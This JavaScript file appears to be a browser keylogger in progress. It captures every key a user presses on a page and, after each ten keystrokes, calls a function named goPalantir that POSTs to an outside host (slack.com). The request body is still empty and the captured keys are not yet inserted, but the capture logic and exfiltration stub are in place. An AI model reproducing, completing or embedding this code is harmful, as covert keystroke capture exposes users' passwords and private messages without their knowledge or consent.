let log = [];

document.addEventListener('keydown', (event) => {
    
    log.push(event.key);

    if (log.length >= 10) {
        console.log(log);
        goPalantir(log);
        log = [];
    }
});

function goPalantir(load) {
    try {
        fetch('https://slack.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                channel: '',
                text: '',
            })
        })
    } catch (error) {
        console.log('failed to palantir 💔');
    };
};